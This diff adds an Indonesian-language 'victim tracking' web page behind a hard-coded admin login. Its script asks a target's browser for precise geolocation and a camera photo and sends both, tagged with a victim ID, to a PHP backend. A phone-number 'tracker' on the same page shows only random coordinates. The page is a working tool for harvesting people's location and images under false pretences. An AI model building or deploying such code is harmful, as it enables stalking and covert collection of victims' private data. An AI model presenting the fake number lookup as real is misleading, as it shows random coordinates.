@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Pelacakan Kritis - Akses Terbatas</title>
+    <!-- Tailwind CSS CDN untuk styling responsif -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <!-- Font Share Tech Mono untuk tampilan 'hacking' -->
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: #0d0d0d; /* Background sangat gelap */
+            color: #e5e7eb; /* Warna teks terang */
+            overflow: hidden; /* Sembunyikan scrollbar agar efek matrix penuh */
+        }
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Posisikan di belakang konten */
+            opacity: 0.2; /* Sedikit transparan */
+        }
+        .tracker-container {
+            background-color: rgba(17, 24, 39, 0.8); /* Warna gelap transparan */
+            border: 1px solid #dc2626; /* Border merah */
+            box-shadow: 0 0 20px rgba(220, 38, 38, 0.7); /* Efek glow merah */
+        }
+        .btn-red {
+            background-color: #dc2626; /* Tombol merah */
+            color: white;
+            transition: background-color 0.3s ease;
+        }
+        .btn-red:hover {
+            background-color: #b91c1c; /* Tombol merah lebih gelap saat hover */
+        }
+        input, select, textarea {
+            background-color: #1f2937; /* Input field gelap */
+            border: 1px solid #dc2626;
+            color: #e5e7eb;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ef4444; /* Border merah terang saat fokus */
+            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.5);
+        }
+        .status-message {
+            color: #fca5a5; /* Warna teks status merah muda */
+        }
+        .header-title {
+            color: #ef4444; /* Warna judul merah terang */
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen text-gray-200 p-4">
+    <canvas id="matrix-canvas"></canvas>
+
+    <!-- Bagian Login -->
+    <div id="login-section" class="tracker-container p-8 rounded-lg max-w-md w-full z-10 mx-auto">
+        <h2 class="text-3xl font-bold mb-6 text-center header-title">Dardcor Tracker System</h2>
+        <p class="text-center mb-6">Sistem Pelacakan Berbasis AI - Akses Terbatas</p>
+        <div class="mb-4">
+            <label for="username" class="block text-sm font-medium mb-2">Username:</label>
+            <input type="text" id="username" class="w-full p-3 rounded" placeholder="Masukkan Username">
+        </div>
+        <div class="mb-6">
+            <label for="password" class="block text-sm font-medium mb-2">Password:</label>
+            <input type="password" id="password" class="w-full p-3 rounded" placeholder="Masukkan Password">
+        </div>
+        <button id="login-btn" class="btn-red w-full p-3 rounded font-bold text-lg">LOGIN KE SISTEM</button>
+        <p id="login-status" class="text-center text-red-400 mt-4 hidden"></p>
+    </div>
+
+    <!-- Bagian Tracker (Tersembunyi secara default) -->
+    <div id="tracker-section" class="tracker-container p-8 rounded-lg max-w-4xl w-full hidden z-10 mx-auto">
+        <h2 class="text-3xl font-bold mb-6 text-center header-title">SISTEM PELACAKAN KORBAN AKTIF</h2>
+        <p class="text-center mb-6 status-message">Status: Online - Menunggu Target</p>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+            <!-- Izin Lokasi & Kamera -->
+            <div class="bg-gray-800 p-6 rounded-lg border border-red-700">
+                <h3 class="text-xl font-bold mb-4 text-red-500">Izin Akses Target</h3>
+                <p class="mb-4 text-gray-400 text-sm">Sistem sedang menunggu izin akses dari perangkat target.</p>
+                <button id="request-location-btn" class="btn-red w-full p-3 rounded mb-3">IZINKAN AKSES LOKASI</button>
+                <input type="file" id="image-capture-input" accept="image/*" capture="camera" class="hidden">
+                <button id="request-image-btn" class="btn-red w-full p-3 rounded">IZINKAN AKSES KAMERA</button>
+                <p id="capture-status" class="status-message mt-4 text-center hidden"></p>
+            </div>
+
+            <!-- Pelacakan Nomor Target -->
+            <div class="bg-gray-800 p-6 rounded-lg border border-red-700">
+                <h3 class="text-xl font-bold mb-4 text-red-500">Pelacakan Nomor Target</h3>
+                <div class="mb-4">
+                    <label for="victim-number" class="block text-sm font-medium mb-2">Nomor Telepon Target:</label>
+                    <input type="text" id="victim-number" class="w-full p-3 rounded" placeholder="Contoh: 081234567890">
+                </div>
+                <button id="track-number-btn" class="btn-red w-full p-3 rounded">LACAK NOMOR</button>
+                <p id="track-status" class="status-message mt-4 text-center hidden"></p>
+            </div>
+        </div>
+
+        <!-- Tampilan Google Maps -->
+        <div class="bg-gray-800 p-6 rounded-lg border border-red-700">
+            <h3 class="text-xl font-bold mb-4 text-red-500">Lokasi Terdeteksi</h3>
+            <div id="map-container" class="relative w-full aspect-video bg-gray-900 rounded-lg overflow-hidden flex items-center justify-center">
+                <iframe id="google-map-iframe" class="w-full h-full" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
+                <p id="map-placeholder" class="absolute text-gray-500">Memuat peta...</p>
+            </div>
+            <p class="text-center text-gray-400 text-sm mt-4">Catatan: Lokasi yang ditampilkan bersifat acak untuk simulasi pelacakan.</p>
+        </div>
+    </div>
+
+    <script>
+        // --- Konfigurasi Umum ---
+        const MATRIX_CHARACTERS = "$#%&@*?!/\\=+-";
+        const MATRIX_FONT_SIZE = 16;
+        const GOOGLE_MAPS_API_KEY = ""; // Anda bisa biarkan kosong jika tidak ingin peta muncul atau tidak punya API Key.
+                                         // Jika Anda punya, masukkan di sini: "GANTI_DENGAN_API_KEY_ANDA"
+        const BACKEND_API_URL = 'api_receive_data.php'; // URL ke script PHP backend
+
+        let victimId = localStorage.getItem('victimId');
+        if (!victimId) {
+            victimId = 'victim_' + Date.now(); // ID unik untuk setiap korban/sesi
+            localStorage.setItem('victimId', victimId);
+        }
+
+        // Batasan koordinat kasar untuk Indonesia
+        const INDONESIA_BOUNDS = {
+            minLat: -11.0, maxLat: 6.0,
+            minLng: 95.0, maxLng: 141.0
+        };
+
+        // --- Efek Background Matrix ---
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        let columns;
+        let drops;
+
+        function initializeMatrix() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            columns = Math.floor(canvas.width / MATRIX_FONT_SIZE);
+            drops = Array(columns).fill(0);
+
+            ctx.fillStyle = '#0d0d0d';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(13, 13, 13, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#dc2626';
+            ctx.font = `${MATRIX_FONT_SIZE}px 'Share Tech Mono'`;
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = MATRIX_CHARACTERS[Math.floor(Math.random() * MATRIX_CHARACTERS.length)];
+                ctx.fillText(text, i * MATRIX_FONT_SIZE, drops[i] * MATRIX_FONT_SIZE);
+
+                if (drops[i] * MATRIX_FONT_SIZE > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        window.addEventListener('resize', initializeMatrix);
+        initializeMatrix();
+        setInterval(drawMatrix, 33);
+
+        // --- Logika Login ---
+        const loginSection = document.getElementById('login-section');
+        const trackerSection = document.getElementById('tracker-section');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('login-btn');
+        const loginStatus = document.getElementById('login-status');
+
+        loginBtn.addEventListener('click', () => {
+            if (usernameInput.value === 'Admin' && passwordInput.value === '4555') {
+                loginSection.classList.add('hidden');
+                trackerSection.classList.remove('hidden');
+                updateRandomMap();
+            } else {
+                loginStatus.textContent = 'AKSES DITOLAK. Username atau Password salah.';
+                loginStatus.classList.remove('hidden');
+            }
+        });
+
+        // --- Logika Permintaan Lokasi dan Kamera ---
+        const requestLocationBtn = document.getElementById('request-location-btn');
+        const requestImageBtn = document.getElementById('request-image-btn');
+        const imageCaptureInput = document.getElementById('image-capture-input');
+        const captureStatus = document.getElementById('capture-status');
+
+        requestLocationBtn.addEventListener('click', () => {
+            captureStatus.classList.remove('hidden');
+            captureStatus.textContent = 'Meminta izin lokasi perangkat target...';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        // --- KIRIM DATA LOKASI KE BACKEND ---
+                        fetch(BACKEND_API_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'location',
+                                victim_id: victimId,
+                                lat: latitude,
+                                lng: longitude,
+                                timestamp: new Date().toISOString()
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.status === 'success') {
+                                captureStatus.textContent = `Lokasi target diizinkan dan dikirim.`;
+                                console.log('Lokasi dikirim:', data);
+                            } else {
+                                captureStatus.textContent = `Gagal mengirim lokasi: ${data.message}`;
+                                console.error('Error pengiriman lokasi:', data);
+                            }
+                        })
+                        .catch(error => {
+                            captureStatus.textContent = `Gagal mengirim lokasi: ${error.message}`;
+                            console.error('Fetch error:', error);
+                        });
+                    },
+                    (error) => {
+                        captureStatus.textContent = `Gagal mendapatkan lokasi: ${error.message}. Target menolak izin.`;
+                        console.error('Error mendapatkan lokasi:', error);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                captureStatus.textContent = 'Geolocation tidak didukung oleh browser ini.';
+            }
+        });
+
+        requestImageBtn.addEventListener('click', () => {
+            captureStatus.classList.remove('hidden');
+            captureStatus.textContent = 'Meminta izin kamera untuk gambar...';
+            imageCaptureInput.click();
+        });
+
+        imageCaptureInput.addEventListener('change', (event) => {
+            if (event.target.files && event.target.files[0]) {
+                const file = event.target.files[0];
+                captureStatus.textContent = `Gambar dari kamera diizinkan dan dikirim...`;
+                console.log('Gambar siap dikirim:', file);
+
+                // --- KIRIM FILE GAMBAR KE BACKEND ---
+                const formData = new FormData();
+                formData.append('type', 'image');
+                formData.append('victim_id', victimId);
+                formData.append('image', file);
+                formData.append('timestamp', new Date().toISOString());
+
+                fetch(BACKEND_API_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        captureStatus.textContent = `Gambar dari kamera diizinkan dan dikirim.`;
+                        console.log('Gambar dikirim:', data);
+                    } else {
+                        captureStatus.textContent = `Gagal mengirim gambar: ${data.message}`;
+                        console.error('Error pengiriman gambar:', data);
+                    }
+                })
+                .catch(error => {
+                    captureStatus.textContent = `Gagal mengirim gambar: ${error.message}`;
+                    console.error('Fetch error:', error);
+                });
+
+            } else {
+                captureStatus.textContent = 'Target menolak izin kamera atau tidak memilih gambar.';
+            }
+        });
+
+        // --- Logika Pelacakan Nomor & Peta Acak ---
+        const victimNumberInput = document.getElementById('victim-number');
+        const trackNumberBtn = document.getElementById('track-number-btn');
+        const trackStatus = document.getElementById('track-status');
+        const googleMapIframe = document.getElementById('google-map-iframe');
+        const mapPlaceholder = document.getElementById('map-placeholder');
+
+        function getRandomCoordinate(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function updateRandomMap() {
+            const randomLat = getRandomCoordinate(INDONESIA_BOUNDS.minLat, INDONESIA_BOUNDS.maxLat);
+            const randomLng = getRandomCoordinate(INDONESIA_BOUNDS.minLng, INDONESIA_BOUNDS.maxLng);
+
+            if (GOOGLE_MAPS_API_KEY) {
+                const mapUrl = `https://www.google.com/maps/embed/v1/place?key=${GOOGLE_MAPS_API_KEY}&q=${randomLat},${randomLng}`;
+                googleMapIframe.src = mapUrl;
+                mapPlaceholder.classList.add('hidden');
+            } else {
+                mapPlaceholder.textContent = "Peta tidak tersedia (API Key Google Maps kosong).";
+                mapPlaceholder.classList.remove('hidden');
+                googleMapIframe.src = 'about:blank';
+            }
+        }
+
+        trackNumberBtn.addEventListener('click', () => {
+            const victimNumber = victimNumberInput.value.trim();
+            if (victimNumber) {
+                trackStatus.classList.remove('hidden');
+                trackStatus.textContent = `Melacak nomor ${victimNumber}... Data lokasi acak dihasilkan.`;
+                console.log(`Melacak nomor: ${victimNumber}`);
+                updateRandomMap();
+            } else {
+                trackStatus.classList.remove('hidden');
+                trackStatus.textContent = 'Silakan masukkan nomor telepon target.';
+            }
+        });
+    </script>
+</body>
+</html>
